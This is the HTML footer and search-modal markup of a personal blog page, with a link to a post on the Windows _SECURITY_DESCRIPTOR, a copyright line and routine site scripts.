    <footer class="pt-8 max-w-prose print:hidden">
      
  
    
    
    
    <div class="pt-8">
      <hr class="border-dotted border-neutral-300 dark:border-neutral-600">
      <div class="flex justify-between pt-3">
        <span>
          
            <a class="flex group mr-3" href="/posts/understanding-the-windows-_security_descriptor/">
              <span
                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
                >&larr;</span
              >
              <span
                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
                >&rarr;</span
              >
              <span class="flex flex-col">
                <span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
                  >Understanding the Windows _SECURITY_DESCRIPTOR</span
                >
                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                  
                </span>
              </span>
            </a>
          
        </span>
        <span>
          
        </span>
      </div>
    </div>
  


      
    </footer>
  </article>

        <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0 z-10">
  <a
    href="#the-top"
    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
    aria-label="Scroll to top"
    title="Scroll to top">
    &uarr;
  </a>
</div>

      </main><footer id="site-footer" class="py-10 print:hidden">
  
  
    
  
  <div class="flex items-center justify-between">
    
    
      <p class="text-sm text-neutral-500 dark:text-neutral-400">
          © 2017 Milton Valencia. All Rights Reserved
      </p>
    

    
    
  </div>
  
    <script>
      mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
        margin: 24,
        background: "rgba(0,0,0,0.5)",
        scrollOffset: 0,
      });
    </script>
  
  
  
  <script
    type="text/javascript"
    src="/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js"
    integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh&#43;sCQ0E53ghYrxgYqw&#43;0GCRyIEpA=="></script>
  
  
</footer>
<div
  id="search-wrapper"
  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500"
  data-url="/">
  <div
    id="search-modal"
    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800">
    <header class="relative z-10 flex items-center justify-between flex-none px-2">
      <form class="flex items-center flex-auto min-w-0">
        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
          <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
</span>
        </div>
        <input
          type="search"
          id="search-query"
          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
          placeholder="Search"
          tabindex="0">
      </form>
      <button
        id="close-search-button"
        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
        title="Close (Esc)">
        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
</span>
      </button>
    </header>
    <section class="flex-auto px-2 overflow-auto">
      <ul id="search-results">
        
      </ul>
    </section>
  </div>
</div>

    </div>
  </body>
  
</html>
